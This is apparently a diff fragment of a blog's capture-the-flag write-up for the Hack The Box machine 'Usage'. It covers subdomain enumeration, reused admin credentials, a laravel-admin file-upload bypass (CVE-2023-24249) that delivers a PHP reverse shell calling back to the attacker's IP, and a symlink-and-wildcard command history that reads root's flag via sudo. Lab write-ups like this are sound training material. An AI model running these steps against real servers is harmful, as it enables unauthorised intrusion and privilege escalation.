+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dns -d <span style="color:#e6db74">&#39;usage.htb&#39;</span>  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt   
+<span style="color:#f92672">===============================================================</span>
+Gobuster v3.6
+by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+<span style="color:#f92672">===============================================================</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Domain:     usage.htb
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:    <span style="color:#ae81ff">10</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:    1s
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:   /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+<span style="color:#f92672">===============================================================</span>
+Starting gobuster in DNS enumeration mode
+<span style="color:#f92672">===============================================================</span>
+Found: admin.usage.htb
+---
+<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>
+</code></pre></div><p>Here&hellip; the credentials worked just fine&hellip; <code>admin:whatever1</code></p>
 <h3 id="foothold">Foothold</h3>
 <ul>
 <li><a href="https://flyd.uk/post/cve-2023-24249/">CVE-2023-24249</a> - RCE in larravel-admin that allows attackers to bypass file upload restrictions, and attackers can upload files in <code>*.php</code> format for code execution.</li>
 </ul>
 <p>Using a tool I wrote, I then created a php reverse shell file using the <code>PentestMonkey</code> PHP reverse shell script.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>genrevshell php -f shell.php -i 10.10.14.40 -p <span style="color:#ae81ff">4444</span> 
-</span></span><span style="display:flex;"><span>---
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> shell.php generated successfully using the PHP Reverse shell script!
-</span></span></code></pre></div><p>After logging in, we can see it is a laravel-admin dashboard for managing services etc. getting a peek at what the site is running, we can see it is running <code>Laravel</code> version <code>10.18.0</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">genrevshell php -f shell.php -i 10.10.14.40 -p <span style="color:#ae81ff">4444</span> 
+---
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> shell.php generated successfully using the PHP Reverse shell script!
+</code></pre></div><p>After logging in, we can see it is a laravel-admin dashboard for managing services etc. getting a peek at what the site is running, we can see it is running <code>Laravel</code> version <code>10.18.0</code>.</p>
 <p>After a bit of research I found the CVE mentioned above and gave it a shot.</p>
 <p>The CVE here basically is when changing the <code>.jpg</code> favicon image for the profile photo, you can intercept the request and change the file extension to <code>.php</code> which the server will then execute.</p>
 <p>So, using <code>shell.php</code> from earlier that I generated; i simply made a copy of the reverse shell as <code>shell.jpg</code> and gave it a shot&hellip;</p>
 <p><strong>Getting root.txt</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ae81ff">11</span>  cd /var/www/html
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">12</span>  ls
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">13</span>  cat root.txt
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">14</span>  file root.txt
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">15</span>  strings ~/root/root.txt
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">16</span>  uname -a
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">17</span>  n
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">18</span>  uname -m
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">19</span>  cat /proc/version
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">20</span>  touch <span style="color:#e6db74">&#39;@root.txt&#39;</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">21</span>  ln -s -r /root/root.txt root.txt
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">22</span>  rm -f root.txt
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">23</span>  ln -s -r /root/root.txt root.txt
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">24</span>  sudo /usr/bin/usage_management
-</span></span><span style="display:flex;"><span>   
-</span></span></code></pre></div><p>Above is a paste of the command history to get the root flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ae81ff">11</span>  cd /var/www/html
+   <span style="color:#ae81ff">12</span>  ls
+   <span style="color:#ae81ff">13</span>  cat root.txt
+   <span style="color:#ae81ff">14</span>  file root.txt
+   <span style="color:#ae81ff">15</span>  strings ~/root/root.txt
+   <span style="color:#ae81ff">16</span>  uname -a
+   <span style="color:#ae81ff">17</span>  n
+   <span style="color:#ae81ff">18</span>  uname -m
+   <span style="color:#ae81ff">19</span>  cat /proc/version
+   <span style="color:#ae81ff">20</span>  touch <span style="color:#e6db74">&#39;@root.txt&#39;</span>
+   <span style="color:#ae81ff">21</span>  ln -s -r /root/root.txt root.txt
+   <span style="color:#ae81ff">22</span>  rm -f root.txt
+   <span style="color:#ae81ff">23</span>  ln -s -r /root/root.txt root.txt
+   <span style="color:#ae81ff">24</span>  sudo /usr/bin/usage_management
+   
+</code></pre></div><p>Above is a paste of the command history to get the root flag.</p>
 </div>
     </article>
   </main>
